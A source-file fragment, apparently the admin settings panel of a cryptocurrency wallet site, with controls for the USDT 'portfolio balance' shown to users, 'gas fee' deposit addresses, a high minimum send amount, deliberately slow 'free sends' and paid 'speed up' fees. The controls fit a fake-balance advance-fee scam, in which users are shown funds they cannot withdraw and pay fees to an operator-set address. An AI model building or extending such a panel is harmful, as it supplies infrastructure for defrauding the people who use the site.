            <Flex row alignItems="center" gap="$spacing8">
              <Settings size={16} color={activeSection === 'settings' ? 'white' : '$neutral1'} />
              <Text variant="buttonLabel3" color={activeSection === 'settings' ? 'white' : '$neutral1'}>
                Settings
              </Text>
            </Flex>
          </TabButton>
          <TabButton active={activeSection === 'ip'} onPress={() => setActiveSection('ip')}>
            <Flex row alignItems="center" gap="$spacing8">
              <Globe size={16} color={activeSection === 'ip' ? 'white' : '$neutral1'} />
              <Text variant="buttonLabel3" color={activeSection === 'ip' ? 'white' : '$neutral1'}>
                IP Access
              </Text>
            </Flex>
          </TabButton>
        </Flex>

        {activeSection === 'ip' ? (
          <IPManagementPanel />
        ) : (
          <>
            {/* ETH Gas Balance */}
            <Flex
              gap="$spacing12"
              backgroundColor="$accent2"
              borderRadius="$rounded12"
              p="$spacing16"
              borderWidth={2}
              borderColor="$accent1"
            >
              <Flex row alignItems="center" gap="$spacing12">
                <Flex centered width={48} height={48} borderRadius="$roundedFull" backgroundColor="$surface1">
                  <Text style={{ fontSize: 24 }}>⟠</Text>
                </Flex>
                <Flex grow>
                  <Text variant="body2" fontWeight="600">
                    ETH Gas Balance
                  </Text>
                  <Text variant="body3" color="$neutral2">
                    Balance used for transaction gas fees
                  </Text>
                </Flex>
                <Flex alignItems="flex-end">
                  <Text variant="heading3" color="$accent1">
                    {settings.ethBalance?.toFixed(4) || '0.0000'} ETH
                  </Text>
                  <Text variant="body4" color="$neutral2">
                    ≈ ${((settings.ethBalance || 0) * settings.ethGasPrice).toFixed(2)}
                  </Text>
                </Flex>
              </Flex>
              <input
                style={{ ...inputStyles, fontSize: 20, textAlign: 'center', fontWeight: 'bold' }}
                type="number"
                step="0.0001"
                value={settings.ethBalance || 0}
                onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                  updateSetting('ethBalance', parseFloat(e.target.value) || 0)
                }
                placeholder="0.5"
              />
            </Flex>

            {/* ETH Deposit Address */}
            <InputContainer>
              <Text variant="body2" fontWeight="600">
                ETH Deposit Address
              </Text>
              <Text variant="body3" color="$neutral2">
                Ethereum address where users can deposit ETH for gas fees
              </Text>
              <input
                style={inputStyles}
                type="text"
                value={settings.ethDepositAddress || ''}
                onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                  updateSetting('ethDepositAddress', e.target.value)
                }
                placeholder="0x742d35Cc6634C0532925a3b844Bc9e7595f5bE91"
              />
            </InputContainer>

            {/* Portfolio Balance */}
            <InputContainer>
              <Text variant="body2" fontWeight="600">
                Portfolio Balance (USDT)
              </Text>
              <Text variant="body3" color="$neutral2">
                The total USDT balance shown in the user&apos;s portfolio
              </Text>
              <input
                style={inputStyles}
                type="number"
                value={settings.portfolioBalance}
                onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                  updateSetting('portfolioBalance', parseFloat(e.target.value) || 0)
                }
                placeholder="1300545.66"
              />
            </InputContainer>

            {/* Gas Deposit Address */}
            <InputContainer>
              <Text variant="body2" fontWeight="600">
                Gas Deposit Address
              </Text>
              <Text variant="body3" color="$neutral2">
                The address where users send gas fees (BTC or ETH)
              </Text>
              <input
                style={inputStyles}
                type="text"
                value={settings.gasDepositAddress}
                onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                  updateSetting('gasDepositAddress', e.target.value)
                }
                placeholder="bc1q..."
              />
            </InputContainer>

            {/* Gas Deposit Currency */}
            <InputContainer>
              <Text variant="body2" fontWeight="600">
                Gas Deposit Currency
              </Text>
              <Text variant="body3" color="$neutral2">
                The currency required for gas deposits
              </Text>
              <select
                style={selectStyles}
                value={settings.gasDepositCurrency}
                onChange={(e: React.ChangeEvent<HTMLSelectElement>) =>
                  updateSetting('gasDepositCurrency', e.target.value as 'BTC' | 'ETH')
                }
              >
                <option value="BTC">Bitcoin (BTC)</option>
                <option value="ETH">Ethereum (ETH)</option>
              </select>
            </InputContainer>

            {/* Minimum Gas Deposit */}
            <InputContainer>
              <Text variant="body2" fontWeight="600">
                Minimum Gas Deposit ({settings.gasDepositCurrency})
              </Text>
              <Text variant="body3" color="$neutral2">
                Minimum amount of {settings.gasDepositCurrency} required for gas
              </Text>
              <input
                style={inputStyles}
                type="number"
                step="0.0001"
                value={settings.minimumGasDeposit}
                onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                  updateSetting('minimumGasDeposit', parseFloat(e.target.value) || 0)
                }
                placeholder="0.028"
              />
            </InputContainer>

            {/* ETH Price */}
            <InputContainer>
              <Text variant="body2" fontWeight="600">
                ETH Price (USD)
              </Text>
              <Text variant="body3" color="$neutral2">
                Current ETH price for gas calculations
              </Text>
              <input
                style={inputStyles}
                type="number"
                value={settings.ethGasPrice}
                onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                  updateSetting('ethGasPrice', parseFloat(e.target.value) || 0)
                }
                placeholder="3640"
              />
            </InputContainer>

            {/* BTC Price */}
            <InputContainer>
              <Text variant="body2" fontWeight="600">
                BTC Price (USD)
              </Text>
              <Text variant="body3" color="$neutral2">
                Current BTC price for gas calculations
              </Text>
              <input
                style={inputStyles}
                type="number"
                value={settings.btcPrice}
                onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                  updateSetting('btcPrice', parseFloat(e.target.value) || 0)
                }
                placeholder="100000"
              />
            </InputContainer>

            {/* Base Gas Fee */}
            <InputContainer>
              <Text variant="body2" fontWeight="600">
                Base Gas Fee (ETH)
              </Text>
              <Text variant="body3" color="$neutral2">
                Base gas fee in ETH before percentage calculation
              </Text>
              <input
                style={inputStyles}
                type="number"
                step="0.0001"
                value={settings.baseGasFeeETH}
                onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                  updateSetting('baseGasFeeETH', parseFloat(e.target.value) || 0)
                }
                placeholder="0.002"
              />
            </InputContainer>

            {/* Gas Fee Percentage */}
            <InputContainer>
              <Text variant="body2" fontWeight="600">
                Gas Fee Percentage
              </Text>
              <Text variant="body3" color="$neutral2">
                Percentage of transaction amount added to gas (0.0005 = 0.05%)
              </Text>
              <input
                style={inputStyles}
                type="number"
                step="0.0001"
                value={settings.gasFeePercentage}
                onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                  updateSetting('gasFeePercentage', parseFloat(e.target.value) || 0)
                }
                placeholder="0.0005"
              />
            </InputContainer>

            {/* Maintenance Mode */}
            <Flex
              gap="$spacing12"
              backgroundColor={settings.maintenanceMode ? '$statusCritical2' : '$surface1'}
              borderRadius="$rounded12"
              p="$spacing16"
              borderWidth={1}
              borderColor={settings.maintenanceMode ? '$statusCritical' : '$surface3'}
            >
              <Flex row alignItems="center" justifyContent="space-between">
                <Flex>
                  <Text
                    variant="body2"
                    fontWeight="600"
                    color={settings.maintenanceMode ? '$statusCritical' : undefined}
                  >
                    🚧 Maintenance Mode
                  </Text>
                  <Text variant="body3" color="$neutral2">
                    {settings.maintenanceMode ? 'ACTIVE - Users see maintenance screen' : 'Site is live for all users'}
                  </Text>
                </Flex>
                <ToggleSwitch
                  active={settings.maintenanceMode}
                  onPress={() => updateSetting('maintenanceMode', !settings.maintenanceMode)}
                  style={{ backgroundColor: settings.maintenanceMode ? '#ef4444' : undefined }}
                >
                  <ToggleKnob active={settings.maintenanceMode} />
                </ToggleSwitch>
              </Flex>

              {settings.maintenanceMode && (
                <InputContainer>
                  <Text variant="body3" color="$neutral2">
                    Maintenance Message
                  </Text>
                  <textarea
                    style={{ ...inputStyles, minHeight: '80px', resize: 'vertical' }}
                    value={settings.maintenanceMessage}
                    onChange={(e: React.ChangeEvent<HTMLTextAreaElement>) =>
                      updateSetting('maintenanceMessage', e.target.value)
                    }
                    placeholder="We are currently performing scheduled maintenance..."
                  />
                </InputContainer>
              )}
            </Flex>

            {/* Free Send Settings */}
            <Flex gap="$spacing12">
              <Flex row alignItems="center" justifyContent="space-between">
                <Flex>
                  <Text variant="body2" fontWeight="600">
                    Free Send Enabled
                  </Text>
                  <Text variant="body3" color="$neutral2">
                    Allow first-time free sends for small amounts
                  </Text>
                </Flex>
                <ToggleSwitch
                  active={settings.freeSendEnabled}
                  onPress={() => updateSetting('freeSendEnabled', !settings.freeSendEnabled)}
                >
                  <ToggleKnob active={settings.freeSendEnabled} />
                </ToggleSwitch>
              </Flex>

              {settings.freeSendEnabled && (
                <InputContainer>
                  <Text variant="body3" color="$neutral2">
                    Free Send Amount (USDT)
                  </Text>
                  <input
                    style={inputStyles}
                    type="number"
                    value={settings.freeSendAmount}
                    onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                      updateSetting('freeSendAmount', parseFloat(e.target.value) || 0)
                    }
                    placeholder="10"
                  />
                </InputContainer>
              )}

              {/* Minimum Send Amount */}
              <InputContainer>
                <Text variant="body2" fontWeight="600">
                  Minimum Send Amount (USDT)
                </Text>
                <Text variant="body3" color="$neutral2">
                  Minimum amount required for USDT transfers. Set to 0 to disable limit.
                </Text>
                <input
                  style={inputStyles}
                  type="number"
                  value={settings.minimumSendAmount || 0}
                  onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                    updateSetting('minimumSendAmount', parseFloat(e.target.value) || 0)
                  }
                  placeholder="10000"
                />
              </InputContainer>

              {/* Slow/Free Send Settings */}
              <Flex
                row
                alignItems="center"
                justifyContent="space-between"
                p="$spacing16"
                backgroundColor="$surface1"
                borderRadius="$rounded12"
              >
                <Flex row alignItems="center" gap="$spacing12">
                  <Settings size={24} color={settings.slowSendEnabled ? '$statusSuccess' : '$neutral3'} />
                  <Flex>
                    <Text variant="body2" fontWeight="600">
                      Free Sends (Slow) {settings.slowSendEnabled ? 'Enabled' : 'Disabled'}
                    </Text>
                    <Text variant="body4" color="$neutral3">
                      {settings.slowSendEnabled
                        ? 'Users can send for free (takes hours to complete)'
                        : 'All sends require gas fee'}
                    </Text>
                  </Flex>
                </Flex>
                <ToggleSwitch
                  active={settings.slowSendEnabled ?? true}
                  onPress={() => updateSetting('slowSendEnabled', !settings.slowSendEnabled)}
                  disabled={saving}
                >
                  <ToggleKnob active={settings.slowSendEnabled ?? true} />
                </ToggleSwitch>
              </Flex>

              {settings.slowSendEnabled && (
                <>
                  <InputContainer>
                    <Text variant="body2" fontWeight="600">
                      Free Send Duration (Hours)
                    </Text>
                    <Text variant="body3" color="$neutral2">
                      How many hours free sends take to complete.
                    </Text>
                    <input
                      style={inputStyles}
                      type="number"
                      value={settings.slowSendDurationHours || 4}
                      onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                        updateSetting('slowSendDurationHours', parseFloat(e.target.value) || 4)
                      }
                      placeholder="4"
                    />
                  </InputContainer>
                  <InputContainer>
                    <Text variant="body2" fontWeight="600">
                      Speed Up Gas Fee Percentage
                    </Text>
                    <Text variant="body3" color="$neutral2">
                      % of normal gas fee charged to speed up pending free sends. 100 = full fee.
                    </Text>
                    <input
                      style={inputStyles}
                      type="number"
                      value={settings.speedUpGasFeePercentage || 100}
                      onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
                        updateSetting('speedUpGasFeePercentage', parseFloat(e.target.value) || 100)
                      }
                      placeholder="100"
                    />
                  </InputContainer>
                </>
              )}
            </Flex>

            {/* Save Button */}
            <Flex gap="$spacing8">
              {error && (
                <Text variant="body3" color="$statusWarning">
                  {error}
                </Text>
              )}
              <SaveButton onPress={handleSave} disabled={saving}>
                <Flex row alignItems="center" gap="$spacing8">
                  {saved && <Check size={20} color="white" />}
                  <Text variant="buttonLabel2" color="white">
                    {saving ? 'Saving...' : saved ? 'Settings Saved!' : 'Save Settings'}
                  </Text>
                </Flex>
              </SaveButton>
            </Flex>

            {/* Current Values Display */}
            <Flex backgroundColor="$surface1" borderRadius="$rounded12" p="$spacing16" gap="$spacing8">
              <Text variant="body3" fontWeight="600" color="$neutral2">
                Current Configuration Summary
              </Text>
              <Text variant="body4" color="$neutral3">
                Balance: ${settings.portfolioBalance.toLocaleString()} USDT
              </Text>
              <Text variant="body4" color="$neutral3">
                Gas Address: {settings.gasDepositAddress.slice(0, 20)}...
              </Text>
              <Text variant="body4" color="$neutral3">
                Min Gas: {settings.minimumGasDeposit} {settings.gasDepositCurrency}
              </Text>
              <Text variant="body4" color="$neutral3">
                Gas Calc: {settings.baseGasFeeETH} ETH + {(settings.gasFeePercentage * 100).toFixed(2)}% of amount
              </Text>
              <Text variant="body4" color="$accent1" fontWeight="600">
                ETH Gas Balance: {settings.ethBalance?.toFixed(4) || '0.0000'} ETH ($
                {((settings.ethBalance || 0) * settings.ethGasPrice).toFixed(2)})
              </Text>
              <Text variant="body4" color={settings.slowSendEnabled ? '$statusSuccess' : '$neutral3'}>
                Free Send:{' '}
                {settings.slowSendEnabled
                  ? `Enabled (${settings.slowSendDurationHours}hr, ${settings.speedUpGasFeePercentage}% fee)`
                  : 'Disabled'}
              </Text>
            </Flex>
          </>
        )}
      </Card>
    </PageContainer>
  )
})

// Main Maduro Page
export default function MaduroPage() {
  const [isAuthenticated, setIsAuthenticated] = useState(false)

  useEffect(() => {
    // Check if already authenticated in this session
    const auth = sessionStorage.getItem('maduro-auth')
    if (auth === 'true') {
      setIsAuthenticated(true)
    }
  }, [])

  if (!isAuthenticated) {
    return <PasswordScreen onAuthenticate={() => setIsAuthenticated(true)} />
  }

  return <AdminPanel />
}
